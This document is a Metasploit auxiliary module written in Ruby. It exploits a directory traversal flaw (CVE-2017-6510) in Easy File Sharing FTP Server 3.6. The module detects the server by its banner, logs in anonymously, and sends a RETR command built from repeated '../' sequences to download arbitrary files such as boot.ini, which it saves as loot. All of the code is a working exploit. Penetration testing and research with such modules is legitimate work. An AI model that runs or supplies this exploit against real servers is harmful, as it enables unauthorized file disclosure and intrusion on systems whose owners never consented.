##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Easy File Sharing FTP Server 3.6 Directory Traversal',
      'Description'    => %q{
        This module exploits a directory traversal vulnerability found in Easy File Sharing FTP Server Version 3.6 and Earlier.
        This vulnerability allows an attacker to download arbitrary files from the server by crafting
        a RETR command that includes file system traversal strings such as '../'
      },
      'Platform'       => 'win',
      'Author'         =>
        [
          'Ahmed Elhady Mohamed'   # @kingasmk ahmed.elhady.mohamed[at]gmail.com
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2017-6510']
        ],
      'DisclosureDate' => 'Mar 07 2017'
    ))

    register_options(
      [
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 32 ]),
        OptString.new('PATH', [ true, "Path to the file to disclose, relative to the root dir.", 'boot.ini'])
      ])
  end

  def check_host(ip)
    begin
      connect
      if /Easy File Sharing FTP Server/i === banner
        return Exploit::CheckCode::Detected
      end
    ensure
      disconnect
    end

    Exploit::CheckCode::Safe
  end

  def run_host(target_host)
    begin
      # Login anonymously and open the socket that we'll use for data retrieval.
      connect_login
      sock = data_connect
      if sock.nil?
        error_msg = 'data_connect failed; posssible invalid response'
        print_status(error_msg)
        elog(error_msg)
      else
        file_path = datastore['PATH']
        file = ::File.basename(file_path)

        # make RETR request and store server response message...
        retr_cmd = ( "../" * datastore['DEPTH'] ) + "#{file_path}"
        res = send_cmd( ["RETR", retr_cmd])

        # read the file data from the socket that we opened
        # dont assume theres still a sock to read from. Per #7582
        if sock.nil?
          error_msg = 'data_connect failed; posssible invalid response'
          print_status(error_msg)
          elog(error_msg)
          return
        else
          # read the file data from the socket that we opened
          response_data = sock.read(1024)
        end

        unless response_data
          print_error("#{file_path} not found")
          return
        end

        if response_data.length == 0 or ! (res =~ /^150/ )
          print_status("File (#{file_path})from #{peer} is empty...")
          return
        end

        # store file data to loot
        loot_file = store_loot("easy.file.sharing.ftp.data", "text", rhost, response_data, file, file_path)
        vprint_status("Data returned:\n")
        vprint_line(response_data)
        print_good("Stored #{file_path} to #{loot_file}")
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
      vprint_error(e.message)
      elog("#{e.class} #{e.message} #{e.backtrace * "\n"}")
    rescue ::Timeout::Error, ::Errno::EPIPE => e
      vprint_error(e.message)
      elog("#{e.class} #{e.message} #{e.backtrace * "\n"}")
    ensure
      data_disconnect
      disconnect
    end
  end
end
